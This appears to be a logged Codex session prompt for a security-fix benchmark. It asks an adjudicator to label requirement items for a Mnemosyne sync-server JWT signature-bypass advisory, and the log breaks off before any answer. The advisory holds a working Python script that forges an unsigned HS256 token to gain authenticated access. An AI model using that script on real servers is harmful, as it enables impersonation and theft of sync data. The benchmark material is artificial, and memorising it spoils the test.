@@ -1,0 +1,1051 @@
+WARNING: proceeding, even though we could not create PATH aliases: Refusing to create helper binaries under temporary dir "/tmp" (codex_home: AbsolutePathBuf("/tmp/tmp.cVuDaMYImp/codexhome"))
+OpenAI Codex v0.160.0
+--------
+workdir: /tmp/tmp.Cbu9tzC5tK
+model: gpt-6.1-sol
+provider: openai
+approval: never
+sandbox: read-only
+reasoning effort: medium
+reasoning summaries: none
+session id: 01a10251-092c-7d91-bab8-9e60d3a9c86d
+--------
+user
+# Adjudication instructions — RD requirement truth (§15.1)
+
+You are one of two independent truth adjudicators for one security-fix fixture. Decide, for the
+stated claim, which requirement items are genuinely required to establish it.
+
+**Use only this bundle:** `definitions.yaml` (the frozen operational definitions), the code context
+at the `vuln` and `fixed` revisions (`code-context/`), `fix-diff.patch`, `advisory-evidence.md`, and
+`execution-evidence.md`. Do not use any other source.
+
+**Claim:** in a JWT-configured Mnemosyne sync server, an unauthenticated network client-controlled
+Authorization header containing a well-formed, unexpired HS256 bearer JWT with a forged signature
+may bypass authentication (CWE-347) and gain read or modification access to sync data. **Domain:**
+the sync endpoint is network-reachable and has a JWT secret configured. The attacker controls the
+HTTP Authorization header, including the bearer token's header, payload, and signature, but does
+not know the configured secret and has no valid credential. The triggering token declares HS256,
+has a future expiration, is otherwise well-formed, and has an invalid signature. Every other state
+(sync data, accounts, environment, and server configuration) may take any value the code allows.
+
+**Task — for every item in `adjudication-sheet.yaml`:**
+- Judge it **independently** against the operational definitions. Label it `REQUIRED`,
+  `NOT_REQUIRED`, or `INDETERMINATE`.
+- `REQUIRED` means: for the claim to hold, this exact requirement (its kind, its per-revision
+  present/absent state, and its anchored program points) must be true. Do **not** label an item
+  `REQUIRED` merely because the fix touches that code — necessity is judged from the definitions and
+  the claim, not from "the commit changed it".
+- `INDETERMINATE` means the definitions do not decide it on the evidence given.
+
+**Missing items (optional):** if you believe a required requirement is absent from the sheet, list
+it in the frozen requirement schema (kind + per-revision anchors). Each anchor must resolve to a real
+program point shown in the supplied code context.
+
+Give one label for every item id. Your final output must use the exact YAML schema at the end of the
+inlined prompt and contain no prose outside that YAML.
+
+========================================================================
+# OPERATIONAL DEFINITIONS (frozen)
+```yaml
+# RD operational definitions (PREREGISTRATION.md §15.1, §15.3, §15.4). Version 2, the one-time
+# revision after decidability round 1 (claim domain and QU-1 only). Frozen (Codex approved, 2026-10-01).
+# Shown verbatim to the adjudicators, who label the synthetic boundary cases against it. Each
+# boundary rule has an id; every boundary case names the rule it tests. Nothing here refers to
+# any fixture. Relation names and endpoint kinds are the frozen ones (hop_verify/relations.yaml,
+# hop_bridge/relations.yaml); the definitions make their boundaries explicit.
+version: 2
+
+common:
+  - id: C-1
+    rule: >
+      A hop names two program points ("from" and "to") in one revision. Each point is the place
+      where a stated expression starts. A relation either holds between the two points or it
+      does not; the definitions below decide which.
+  - id: C-2
+    rule: >
+      "Within the function" means inside the same function or method body. The body of a nested
+      function, closure (Go function literal), Python lambda or comprehension is a different
+      function, except where a rule says otherwise.
+  - id: C-3
+    rule: >
+      "Local value flow" means a value passes unchanged from one local variable to another by
+      assignment (a := x, a = x), including from a parameter. A call does not pass a value by
+      local value flow unless a rule says so.
+
+relations:
+  object_composition:
+    language: go
+    definition: >
+      `from` is a statement that defines a local variable (v := e, v = e, var v = e) or stores
+      into a field through a variable (v.f = e). `to` is a field store x.g = e'. The hop holds
+      when the object that `from` defines (or modifies through v) is, by local value flow and
+      without passing through any other field store, one of the values `to` stores, or a direct
+      part of one.
+    rules:
+      - id: OC-1
+        rule: >
+          The values `x.g = e'` stores are e'. For `x.g = append(x.g, a1, ..., an)` they are the
+          appended arguments a1 ... an, never x.g itself.
+      - id: OC-2
+        rule: >
+          A direct part of a stored value is a literal element, a keyed value, the operand of
+          `&`, or a call argument inside that value's expression, at any depth of that one
+          expression.
+      - id: OC-3
+        rule: >
+          Container spread. In `x.g = append(x.g, src...)` the spread container `src` is a stored
+          value. The hop from the statement defining the version of `src` that is spread holds:
+          one step. How elements got into `src` earlier is a separate, earlier hop; from an
+          element's definition to this store does not hold (two steps, not folded into one).
+      - id: OC-4
+        rule: >
+          Version. `from` must define the version of the variable that reaches the stored value
+          by local value flow. A definition that is later overwritten does not hold; `v = append(v,
+          ...)` defines a new version of v.
+      - id: OC-5
+        rule: >
+          Earlier store. An object that reaches the stored value only by being read back out of
+          a field (after an earlier field store put it there) does not hold for `from`'s
+          definition. The earlier field store itself is a separate hop.
+      - id: OC-6
+        rule: The container x of the store `x.g = ...` is not a stored value.
+      - id: OC-7
+        rule: >
+          Pointers and copies. When `from` modifies an object through a pointer variable (p.f =
+          e) and the store's value is another variable holding the same pointer, the same object
+          is stored: the hop holds. A value copy of a struct (w := v) is a different object;
+          modifying the copy does not modify v.
+
+  field_flow:
+    language: go
+    definition: >
+      `from` is a statement defining one or more local variables. `to` is a keyed struct literal
+      field `f: e` or a field store `x.f = e`. The hop holds when a value defined at `from`
+      reaches e within the function, through local variables and through calls that receive it
+      (or a value derived from it) as an argument and derive their result from it.
+    rules:
+      - id: FF-1
+        rule: A statement defining several variables defines each; the hop holds if any of them reaches e.
+      - id: FF-2
+        rule: A value overwritten before e is evaluated does not reach e.
+      - id: FF-3
+        rule: >
+          Closures. A value that reaches e only through a function literal (a captured variable
+          read inside the closure) does not reach e within the function, even when the closure
+          is called inside e.
+      - id: FF-4
+        rule: >
+          A call derives its result from an argument when the result can depend on it (e.g. a
+          string function). Assignment chains count (C-3).
+
+  guard_property:
+    language: go
+    definition: >
+      `from` is a keyed field `f: e` anywhere inside the composite literal that initializes a
+      local variable v at its definition (through nested literals, keyed values and `&`). `to`
+      is a field store v.g = e2 whose v reads that same definition of v.
+    rules:
+      - id: GP-1
+        rule: Keyed fields inside nested literals or inside `&T{...}` within the initializer count.
+      - id: GP-2
+        rule: If v is redefined between the literal and the store, the store reads a different definition; the hop does not hold.
+      - id: GP-3
+        rule: >
+          The relation is structural: it does not judge whether the property matters. Every keyed
+          field of the literal, including a sibling field unrelated to the store, holds. Whether a
+          property is required is a requirement question (qualifiers, QU-1).
+
+  def_use:
+    language: [go, python]
+    definition: >
+      `from` defines a value: in Go a statement defining local variables, a function parameter,
+      or the value variable of a range clause; in Python a parameter or a single-name assignment.
+      `to` is a later statement defining a local variable (Python: a single-name assignment)
+      whose right-hand side reads that value, or (Go) a call argument whose expression reads it,
+      or (Python) a call any of whose positional or keyword arguments reads it. The read must be
+      within the function and of the value as defined at `from`, by local value flow.
+    rules:
+      - id: DU-1
+        rule: Reading a variable assigned from the value counts (a := x; b := a + y reads x's value).
+      - id: DU-2
+        rule: A value overwritten (including a reassigned parameter) before the read does not reach it.
+      - id: DU-3
+        rule: >
+          Reads inside a closure, lambda, nested function or comprehension body do not count
+          (C-2). Exception (Python): the outermost iterable of a comprehension is evaluated in the
+          enclosing function, so a read there counts.
+      - id: DU-4
+        rule: A read as the base of a selector or attribute, an index, or a call receiver counts as reading the value.
+      - id: DU-5
+        rule: A Go statement defining several variables defines each; the hop holds if any of them is read.
+
+  argument_binding:
+    language: go
+    definition: >
+      `from` is argument i of a call (counting from 0, not the receiver). `to` is parameter i of
+      a function or method the call can run at run time.
+    rules:
+      - id: AB-1
+        rule: >
+          Dynamic calls. A call through an interface value can run the method of a dynamic type T
+          only if a value of type T can reach the receiver: through assignments, parameter
+          passing, returns and stores in the program. When the receiver comes from a parameter of
+          a function that code outside the program can call (an exported function, a registered
+          handler), a value of T can also arrive from outside, but only if outside code can obtain
+          one (T is exported, or something exported yields a T). Implementing the interface is
+          not enough. A call of a function value can run exactly the functions that value can
+          hold, by the same reasoning: a function with a matching signature that is never
+          assigned to it cannot run. (The verifier follows static resolution only; such true hops
+          may stay UNVERIFIED.)
+      - id: AB-2
+        rule: An argument passed into a variadic parameter's tail is not bound to that parameter (it receives a slice).
+      - id: AB-3
+        rule: The receiver of a method call is not an argument and is never bound to a parameter.
+      - id: AB-4
+        rule: Argument i binds parameter i only.
+
+  range_element:
+    language: go
+    definition: >
+      `from` defines a collection (a statement defining a local variable, or a parameter). `to`
+      is the value variable of a range clause whose ranged expression is that same value by
+      local value flow.
+    rules:
+      - id: RE-1
+        rule: "`for i := range xs` binds the index (or map key), not an element: a one-variable range has no value variable."
+      - id: RE-2
+        rule: Ranging over a local variable assigned from the collection counts (C-3).
+      - id: RE-3
+        rule: Ranging over a field or element of the value (range t.Items) is not ranging over the value itself.
+      - id: RE-4
+        rule: Map values are elements; the value variable of `for k, v := range m` holds.
+
+  call_typed_attribute:
+    language: python
+    definition: >
+      `from` is a call a.b.m(...). The hop holds when, at run time, the call can invoke the
+      function whose body contains `to`.
+    rules:
+      - id: CT-1
+        rule: >
+          When every object the attribute can hold (by the assignments in the program) is of a
+          class whose m overrides the base class's m, the base class's m cannot be invoked.
+
+  registry_dispatch:
+    language: python
+    definition: >
+      `from` is a call r.m(...) where r is looked up from a registry keyed by input data. The hop
+      holds when, at run time, the call can invoke the method whose body contains `to`.
+    rules:
+      - id: RD-1
+        rule: A method of a class none of whose instances is ever placed in the registry cannot be invoked through it.
+
+requirements:
+  claim: >
+    The task states a claim: in a package, attacker-controlled input may lead to a weakness
+    (CWE name). A "triggering input" is an attacker-controlled input with which the claimed
+    effect occurs at the vulnerable revision. An "admissible execution" is a run of the
+    vulnerable revision on a triggering input in which the effect occurs, with every state the
+    attacker does not control (accounts, sessions, configuration, environment, files) at any
+    value the code allows, unless the scenario states otherwise. The scenario says what the
+    attacker controls.
+  entry:
+    definition: >
+      The program point where the attacker-controlled input named in the claim first becomes a
+      value in the repository's code.
+    rules:
+      - id: EN-1
+        rule: >
+          When a parameter of the exposed function holds exactly that input (for a claim about
+          a request as a whole, such as missing authorization or information exposure, the
+          request parameter), the entry is that parameter.
+      - id: EN-2
+        rule: >
+          When the input is a part of a larger object (one query parameter of a request, one key
+          of a token header), the entry is the first definition that extracts that part, not
+          the parameter holding the whole object.
+      - id: EN-3
+        rule: A value derived from the input after its first extraction is not the entry.
+  behavior:
+    definition: >
+      The program point that decides the security-relevant effect for the triggering input.
+    rules:
+      - id: BE-1
+        rule: >
+          When the fix adds, removes or changes a check or a transform on the path, the behavior
+          is that check or transform (at each revision where it exists).
+      - id: BE-2
+        rule: >
+          Otherwise (the fix changes the dangerous operation itself, removes it, or changes
+          something off the path such as a registry), the behavior is the statement performing
+          the security-relevant effect.
+      - id: BE-3
+        rule: >
+          Several changed checks or transforms. When the fix changes more than one check or
+          transform on the path, the behavior is the changed one nearest the effect (the last one
+          the triggering input passes before the effect) whose result directly decides whether
+          the effect occurs. When two candidates cannot be ordered that way (for example, on
+          different branches that each decide the effect), the behavior is INDETERMINATE_TRUTH and
+          the fixture is replaced under the charter's rule.
+  absent_context:
+    definition: >
+      An element absent at one revision is written as absent with a context: the counterpart, at
+      the absent revision, of the statement the element controls or feeds at the present revision.
+    rules:
+      - id: AC-1
+        rule: For a guard, the statement it protects (for `if cond { ...; return }`, the first statement after the if).
+      - id: AC-2
+        rule: For a transform, the first statement that reads the transformed value.
+      - id: AC-3
+        rule: >
+          For an entry or behavior, the diff-aligned statement: when the element was inserted,
+          the statement right after the insertion point; when it was removed, the statement right
+          after the removal point (not the one before it).
+  state:
+    - id: ST-1
+      rule: >
+        Each anchor is given per revision as present (the code exists there) or absent (it does
+        not). A behavior that the fix removes is absent at the fixed revision even though a
+        neighboring statement exists there.
+
+qualifiers:
+  general:
+    - id: QU-1
+      rule: >
+        Necessity. A guard, transform, config or dispatch target is required only if it is a
+        necessary condition of the claimed effect at the vulnerable revision: it holds, in its
+        stated sense, in every admissible execution (see claim), and it is not a condition that
+        every execution of the code satisfies anyway. Mattering for some inputs or some states
+        only is not enough. Per kind:
+        guard: every admissible execution passes the predicate with the stated polarity.
+        config: every admissible execution needs the stated configuration condition.
+        dispatch_target: every admissible execution dispatches the call to the target.
+        transform: must_be_present when, with the transform removed (its input passed through
+        unchanged), no admissible execution remains; must_be_absent when, with the transform
+        applied, none remains.
+        An element absent at the vulnerable revision (added by the fix) is required only if
+        adding it there, as it is at the fixed revision, would stop the effect in every
+        admissible execution; its expected semantics is read at the fixed revision (GU-1).
+        A sibling property or a neighboring check without that necessity is not required.
+    - id: QU-2
+      rule: >
+        The one check or transform chosen as the behavior (BE-1, BE-3) is not also a qualifier.
+        Other changed checks or transforms can be qualifiers when QU-1 holds.
+    - id: QU-3
+      rule: >
+        Conditions the attacker satisfies by choosing the triggering input (the request method,
+        the presence of a parameter) are part of the input, not qualifiers.
+    - id: QK-1
+      rule: >
+        Kind. A condition on a field of an in-memory object is a guard, even when the object was
+        built from configuration. `config` is used only when the code reads a configuration
+        source by key or name (an environment variable, a configuration map lookup, a flag).
+  guard:
+    definition: >
+      A property of an object on the path that must hold (or must not hold) for the behavior to
+      occur. Fields: subject (where the object is defined), predicate (where the property is
+      checked), expected.
+    rules:
+      - id: GU-1
+        rule: >
+          Polarity. The property is the boolean condition as written at the predicate. expected
+          is must_hold when the behavior occurs only if that condition is true, must_not_hold
+          when only if it is false (for `if p.M != "raw" { return }`, must_not_hold).
+  transform:
+    definition: >
+      A transformation of a value on the path whose presence or absence decides the behavior.
+      Fields: subject (the value transformed), transform (where it is applied), expected:
+      must_be_present or must_be_absent for the behavior to occur.
+  config:
+    definition: >
+      A configuration value that must satisfy a condition for the behavior to occur. Fields:
+      subject (the statement where the value affects the path), config (the expression that
+      reads the configuration item), expected_condition {op: equals | not_equals | set | unset,
+      value}.
+    rules:
+      - id: CF-1
+        rule: >
+          The condition is the one the behavior needs. `set` means any value; when the code
+          compares with a specific value, `set` is not sufficient and the condition is `equals`
+          that value.
+  dispatch_target:
+    definition: >
+      The implementation a dynamic call must reach for the behavior to occur. Fields: call (the
+      call site), target (the definition of the implementation reached).
+```
+
+========================================================================
+# ADVISORY — FACTUAL EVIDENCE
+
+# Advisory factual evidence — GHSA-xcw4-53cc-hv32
+
+Mechanical, fact-only extract for adjudication. Fix-attribution lines are removed (logged
+below); no hand paraphrase. The fix diff is supplied separately, not here.
+
+- Advisory: GHSA-xcw4-53cc-hv32  (aliases: CVE-2026-59163, PYSEC-2026-4106)
+- Affected package: PyPI: mnemosyne-memory
+- Severity: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+- Published: 2026-09-18T17:54:26Z
+- Summary: Mnemosyne has JWT signature verification bypass sync server that allows authentication bypass
+- Source: https://github.com/AxDSan/mnemosyne/security/advisories/GHSA-xcw4-53cc-hv32
+
+## Details (verbatim, fix-attribution lines removed)
+
+### Summary
+
+The Mnemosyne sync server's authentication check decoded JWT bearer tokens but never verified their HMAC-SHA256 signatures. Any well-formed token was accepted, allowing an unauthenticated attacker to impersonate any user and read or modify their sync data.
+
+**Severity: Critical**
+
+CVSS 3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
+
+Assumes the sync server endpoint is network-reachable. If your deployment is localhost-only, the score drops substantially and severity becomes High or Medium depending on local exposure. Confirm your threat model.
+
+### Affected versions
+
+All mnemosyne versions exposing the sync server endpoint, up to and including v3.10.0.
+
+
+v3.10.1 (commit a0b6b871 on branch security/jwt-signature-verification)
+
+___
+
+### Description
+
+The sync server uses JWT bearer tokens to authenticate clients. Prior to v3.10.1, the auth check in mnemosyne/core/sync_server.py parsed the JWT's header and payload using base64 decoding, then passed the token to a jwt library call with options that effectively disabled signature verification. The server accepted any well-formed token regardless of the signature, including tokens with alg: none and tokens signed with the wrong key.
+
+
+- Constant-time signature comparison via hmac.compare_digest
+- Strict alg: HS256 check, rejecting none and other algorithms
+- UTC-aware exp validation with leeway
+- Loud errors with specific failure reasons
+- Type validation of decoded payload before use
+
+### Impact
+
+An attacker with network access to the sync server can:
+
+- Forge a JWT for any user_id without knowing the secret
+- Authenticate as that user to /sync/status, /sync/push, and /sync/pull
+- Read the victim's sync state
+- Push malicious sync state to corrupt the victim's local database
+- Pivot within a shared deployment (multi-user sync server)
+
+Confidentiality and integrity of sync data are fully compromised for the duration of exposure. There is no impact on the server's availability.
+
+### Reproduction
+
+```python
+import base64
+import json
+import requests
+
+# Forge a JWT for any user. No secret required.
+def forge_jwt(user_id):
+    header = base64.urlsafe_b64encode(
+        json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
+    ).rstrip(b"=")
+    payload = base64.urlsafe_b64encode(
+        json.dumps({"user_id": user_id, "exp": 9999999999}).encode()
+    ).rstrip(b"=")
+    sig = b""
+    return f"{header.decode()}.{payload.decode()}."
+
+r = requests.get(
+    "https://target.example.com/sync/status",
+    headers={"Authorization": f"Bearer {forge_jwt('victim-user-id')}"},
+)
+print(r.status_code, r.json())
+```
+
+A 200 OK response with valid sync status payload confirms the bypass. The attack requires no credentials, no secret, and no prior access.
+
+
+Upgrade to v3.10.1.
+
+For users who cannot upgrade immediately:
+
+- Restrict network access to the sync server endpoint to trusted clients only. Firewall, reverse proxy with mTLS, or localhost bind with SSH tunnel are all viable.
+- The vulnerability is not exploitable against an unreachable endpoint.
+
+### Workarounds
+
+
+### Credits
+
+- Reporter: Denis Hache (dplush). Reported via private channel on 2026-06-13 with full reproduction and a coordinated disclosure window.
+- Fix: Denis Hache
+
+### Timeline
+- 2026-06-13: Initial report received from Denis via private channel.
+
+## References (fix-commit excluded)
+- WEB: https://github.com/AxDSan/mnemosyne/security/advisories/GHSA-xcw4-53cc-hv32
+- WEB: https://github.com/mnemosyne-oss/mnemosyne/pull/373
+- PACKAGE: https://github.com/AxDSan/mnemosyne
+- WEB: https://github.com/mnemosyne-oss/mnemosyne/releases/tag/v3.10.1
+
+## Redaction note
+- 4 fix-attribution line(s) and 1 fix-locating reference(s) were removed so this evidence carries the vulnerability facts without the remediation answer.
+- The verbatim removed lines are recorded author-side only (`advisory-redaction-log.md`), not in this judge bundle, to avoid leaking fix-attribution.
+
+========================================================================
+# EXECUTION EVIDENCE (observed facts)
+
+# Execution evidence (observed facts) — GHSA-xcw4-53cc-hv32
+
+Observed behavior of the two revisions under identical regression-test inputs. Facts only; no
+conclusion is drawn about which program point is the entry or behavior.
+
+- Setup: a local HTTP server on `127.0.0.1` using `SyncHTTPHandler`, with `api_key = None` and
+  `jwt_secret = "test-secret"`.
+- Triggering request: `GET /sync/status` with an `Authorization: Bearer <token>` header. The token
+  has a JSON-object header `{"alg":"HS256","typ":"JWT"}`, a JSON-object payload with
+  `{"sub":"attacker","exp":<one hour in the future>}`, and the literal signature `forged`,
+  which was not computed from `test-secret`.
+- Method: the fix revision's JWT regression tests were applied unchanged to both revisions.
+
+Observed results:
+
+| case | vuln revision | fixed revision |
+|---|---|---|
+| well-formed HS256 token with forged signature | HTTP 200 | HTTP 401 (`invalid JWT signature`) |
+| token with `alg: none` and forged signature | HTTP 200 | HTTP 401 (`unsupported JWT algorithm`) |
+| token with malformed non-ASCII signature | HTTP 200 | HTTP 401 (`invalid JWT signature`) |
+| valid HS256 token | HTTP 200 | HTTP 200 |
+| expired validly signed token | HTTP 401 | HTTP 401 |
+
+The complete JWT test selection reported `3 failed, 2 passed` at the vulnerable revision and
+`5 passed` at the fixed revision. The three vulnerable-revision failures are the first three rows,
+where the tests expected rejection but received acceptance.
+
+The advisory evidence separately states that accepted JWT authentication permits access to
+`/sync/status`, `/sync/push`, and `/sync/pull`, including reads and modifications of sync data.
+
+========================================================================
+# FIX DIFF (vuln -> fixed)
+```diff
+diff --git a/mnemosyne/core/sync_server.py b/mnemosyne/core/sync_server.py
+index ae344b6..198032f 100644
+--- a/mnemosyne/core/sync_server.py
++++ b/mnemosyne/core/sync_server.py
+@@ -9,6 +9,9 @@ Provides endpoints for peer-to-peer memory synchronization:
+ - GET  /sync/status — server sync statistics
+ """
+ 
++import base64
++import hashlib
++import hmac
+ import importlib
+ import json
+ import logging
+@@ -37,7 +40,7 @@ class SyncHTTPHandler(BaseHTTPRequestHandler):
+     """
+ 
+     # Set externally by run_sync_server()
+-    sync_engine = None  # type: ignore
++    sync_engine: Any = None
+     api_key: Optional[str] = None
+     jwt_secret: Optional[str] = None
+ 
+@@ -78,6 +81,57 @@ class SyncHTTPHandler(BaseHTTPRequestHandler):
+             self._send_error(400, f"Failed to read body: {e}")
+             return None
+ 
++    @staticmethod
++    def _decode_jwt_part(value: str) -> dict:
++        """Decode one base64url-encoded JWT JSON segment."""
++        padding = "=" * (-len(value) % 4)
++        try:
++            raw = base64.urlsafe_b64decode((value + padding).encode("ascii"))
++            decoded = json.loads(raw.decode("utf-8"))
++        except Exception as e:
++            raise ValueError("invalid JWT encoding") from e
++        if not isinstance(decoded, dict):
++            raise ValueError("invalid JWT JSON")
++        return decoded
++
++    def _validate_jwt(self, token: str) -> dict:
++        """Validate a compact HS256 JWT using the configured shared secret."""
++        if not self.jwt_secret:
++            raise ValueError("JWT secret is not configured")
++
++        parts = token.split(".")
++        if len(parts) != 3:
++            raise ValueError("invalid JWT format")
++
++        header = self._decode_jwt_part(parts[0])
++        payload = self._decode_jwt_part(parts[1])
++        algorithm = header.get("alg")
++        if algorithm != "HS256":
++            raise ValueError("unsupported JWT algorithm")
++
++        signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
++        expected = hmac.new(
++            self.jwt_secret.encode("utf-8"), signing_input, hashlib.sha256
++        ).digest()
++        expected_sig = base64.urlsafe_b64encode(expected).decode("ascii").rstrip("=")
++        try:
++            valid_signature = hmac.compare_digest(parts[2], expected_sig)
++        except TypeError as e:
++            raise ValueError("invalid JWT signature") from e
++        if not valid_signature:
++            raise ValueError("invalid JWT signature")
++
++        exp = payload.get("exp")
++        if exp is not None:
++            try:
++                if float(exp) < datetime.now(timezone.utc).timestamp():
++                    raise ValueError("token expired")
++            except (TypeError, ValueError) as e:
++                if isinstance(e, ValueError) and str(e) == "token expired":
++                    raise
++                raise ValueError("invalid JWT exp") from e
++        return payload
++
+     def _check_auth(self) -> bool:
+         """Check API key / JWT authentication.
+ 
+@@ -101,29 +155,11 @@ class SyncHTTPHandler(BaseHTTPRequestHandler):
+             if not auth.startswith("Bearer "):
+                 self._send_error(401, "Missing Bearer token")
+                 return False
+-            token = auth[7:]
++
+             try:
+-                # Minimal JWT decode without dependencies
+-                import base64 as _b64
+-                parts = token.split(".")
+-                if len(parts) != 3:
+-                    self._send_error(401, "Invalid JWT format")
+-                    return False
+-                # Decode payload (part 1, 0-indexed)
+-                payload_b64 = parts[1]
+-                # Fix padding
+-                pad = 4 - len(payload_b64) % 4
+-                if pad != 4:
+-                    payload_b64 += "=" * pad
+-                payload_bytes = _b64.urlsafe_b64decode(payload_b64)
+-                payload = json.loads(payload_bytes.decode("utf-8"))
+-                # Check expiry
+-                exp = payload.get("exp", 0)
+-                if exp and exp < datetime.now().timestamp():
+-                    self._send_error(401, "Token expired")
+-                    return False
++                self._validate_jwt(auth[7:])
+                 return True
+-            except Exception as e:
++            except ValueError as e:
+                 self._send_error(401, f"JWT validation failed: {e}")
+                 return False
+ 
+```
+
+========================================================================
+# VULN REVISION CODE CONTEXT
+
+# Code context — vuln revision
+
+
+## mnemosyne/core/sync_server.py (lines 80-179)
+
+```python
+  80  
+  81      def _check_auth(self) -> bool:
+  82          """Check API key / JWT authentication.
+  83  
+  84          Returns True if request is authorized, otherwise sends 401
+  85          and returns False.
+  86          """
+  87          if self.api_key is None and self.jwt_secret is None:
+  88              return True  # No auth configured
+  89  
+  90          if self.api_key:
+  91              auth = self.headers.get("Authorization", "")
+  92              if auth.startswith("Bearer "):
+  93                  token = auth[7:]
+  94                  if token == self.api_key:
+  95                      return True
+  96              self._send_error(401, "Invalid or missing API key")
+  97              return False
+  98  
+  99          if self.jwt_secret:
+ 100              auth = self.headers.get("Authorization", "")
+ 101              if not auth.startswith("Bearer "):
+ 102                  self._send_error(401, "Missing Bearer token")
+ 103                  return False
+ 104              token = auth[7:]
+ 105              try:
+ 106                  # Minimal JWT decode without dependencies
+ 107                  import base64 as _b64
+ 108                  parts = token.split(".")
+ 109                  if len(parts) != 3:
+ 110                      self._send_error(401, "Invalid JWT format")
+ 111                      return False
+ 112                  # Decode payload (part 1, 0-indexed)
+ 113                  payload_b64 = parts[1]
+ 114                  # Fix padding
+ 115                  pad = 4 - len(payload_b64) % 4
+ 116                  if pad != 4:
+ 117                      payload_b64 += "=" * pad
+ 118                  payload_bytes = _b64.urlsafe_b64decode(payload_b64)
+ 119                  payload = json.loads(payload_bytes.decode("utf-8"))
+ 120                  # Check expiry
+ 121                  exp = payload.get("exp", 0)
+ 122                  if exp and exp < datetime.now().timestamp():
+ 123                      self._send_error(401, "Token expired")
+ 124                      return False
+ 125                  return True
+ 126              except Exception as e:
+ 127                  self._send_error(401, f"JWT validation failed: {e}")
+ 128                  return False
+ 129  
+ 130          return True  # No auth configured
+ 131  
+ 132      # --- CORS preflight ---
+ 133      def do_OPTIONS(self) -> None:
+ 134          self.send_response(204)
+ 135          self.send_header("Access-Control-Allow-Origin", "*")
+ 136          self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+ 137          self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
+ 138          self.send_header("Access-Control-Max-Age", "86400")
+ 139          self.end_headers()
+ 140  
+ 141      # --- POST /sync/pull ---
+ 142      def do_POST(self) -> None:
+ 143          parsed = self._parse_path(self.path)
+ 144          if parsed is None:
+ 145              self._send_error(404, f"Not found: {self.path}")
+ 146              return
+ 147  
+ 148          endpoint, _ = parsed
+ 149  
+ 150          if endpoint == "/sync/pull":
+ 151              self._handle_pull()
+ 152          elif endpoint == "/sync/push":
+ 153              self._handle_push()
+ 154          else:
+ 155              self._send_error(404, f"Not found: {self.path}")
+ 156  
+ 157      # --- GET /sync/status ---
+ 158      def do_GET(self) -> None:
+ 159          parsed = self._parse_path(self.path)
+ 160          if parsed is None:
+ 161              self._send_error(404, f"Not found: {self.path}")
+ 162              return
+ 163  
+ 164          endpoint, _ = parsed
+ 165  
+ 166          if endpoint == "/sync/status":
+ 167              self._handle_status()
+ 168          else:
+ 169              self._send_error(404, f"Not found: {self.path}")
+ 170  
+ 171      @staticmethod
+ 172      def _parse_path(path: str):
+ 173          """Parse request path, strip query string, return (path, query)."""
+ 174          if "?" in path:
+ 175              path, query = path.split("?", 1)
+ 176          else:
+ 177              query = ""
+ 178          # Ensure trailing slash doesn't break matching
+ 179          path = path.rstrip("/") or "/"
+```
+
+========================================================================
+# FIXED REVISION CODE CONTEXT
+
+# Code context — fixed revision
+
+
+## mnemosyne/core/sync_server.py (lines 80-179)
+
+```python
+  80          except Exception as e:
+  81              self._send_error(400, f"Failed to read body: {e}")
+  82              return None
+  83  
+  84      @staticmethod
+  85      def _decode_jwt_part(value: str) -> dict:
+  86          """Decode one base64url-encoded JWT JSON segment."""
+  87          padding = "=" * (-len(value) % 4)
+  88          try:
+  89              raw = base64.urlsafe_b64decode((value + padding).encode("ascii"))
+  90              decoded = json.loads(raw.decode("utf-8"))
+  91          except Exception as e:
+  92              raise ValueError("invalid JWT encoding") from e
+  93          if not isinstance(decoded, dict):
+  94              raise ValueError("invalid JWT JSON")
+  95          return decoded
+  96  
+  97      def _validate_jwt(self, token: str) -> dict:
+  98          """Validate a compact HS256 JWT using the configured shared secret."""
+  99          if not self.jwt_secret:
+ 100              raise ValueError("JWT secret is not configured")
+ 101  
+ 102          parts = token.split(".")
+ 103          if len(parts) != 3:
+ 104              raise ValueError("invalid JWT format")
+ 105  
+ 106          header = self._decode_jwt_part(parts[0])
+ 107          payload = self._decode_jwt_part(parts[1])
+ 108          algorithm = header.get("alg")
+ 109          if algorithm != "HS256":
+ 110              raise ValueError("unsupported JWT algorithm")
+ 111  
+ 112          signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
+ 113          expected = hmac.new(
+ 114              self.jwt_secret.encode("utf-8"), signing_input, hashlib.sha256
+ 115          ).digest()
+ 116          expected_sig = base64.urlsafe_b64encode(expected).decode("ascii").rstrip("=")
+ 117          try:
+ 118              valid_signature = hmac.compare_digest(parts[2], expected_sig)
+ 119          except TypeError as e:
+ 120              raise ValueError("invalid JWT signature") from e
+ 121          if not valid_signature:
+ 122              raise ValueError("invalid JWT signature")
+ 123  
+ 124          exp = payload.get("exp")
+ 125          if exp is not None:
+ 126              try:
+ 127                  if float(exp) < datetime.now(timezone.utc).timestamp():
+ 128                      raise ValueError("token expired")
+ 129              except (TypeError, ValueError) as e:
+ 130                  if isinstance(e, ValueError) and str(e) == "token expired":
+ 131                      raise
+ 132                  raise ValueError("invalid JWT exp") from e
+ 133          return payload
+ 134  
+ 135      def _check_auth(self) -> bool:
+ 136          """Check API key / JWT authentication.
+ 137  
+ 138          Returns True if request is authorized, otherwise sends 401
+ 139          and returns False.
+ 140          """
+ 141          if self.api_key is None and self.jwt_secret is None:
+ 142              return True  # No auth configured
+ 143  
+ 144          if self.api_key:
+ 145              auth = self.headers.get("Authorization", "")
+ 146              if auth.startswith("Bearer "):
+ 147                  token = auth[7:]
+ 148                  if token == self.api_key:
+ 149                      return True
+ 150              self._send_error(401, "Invalid or missing API key")
+ 151              return False
+ 152  
+ 153          if self.jwt_secret:
+ 154              auth = self.headers.get("Authorization", "")
+ 155              if not auth.startswith("Bearer "):
+ 156                  self._send_error(401, "Missing Bearer token")
+ 157                  return False
+ 158  
+ 159              try:
+ 160                  self._validate_jwt(auth[7:])
+ 161                  return True
+ 162              except ValueError as e:
+ 163                  self._send_error(401, f"JWT validation failed: {e}")
+ 164                  return False
+ 165  
+ 166          return True  # No auth configured
+ 167  
+ 168      # --- CORS preflight ---
+ 169      def do_OPTIONS(self) -> None:
+ 170          self.send_response(204)
+ 171          self.send_header("Access-Control-Allow-Origin", "*")
+ 172          self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
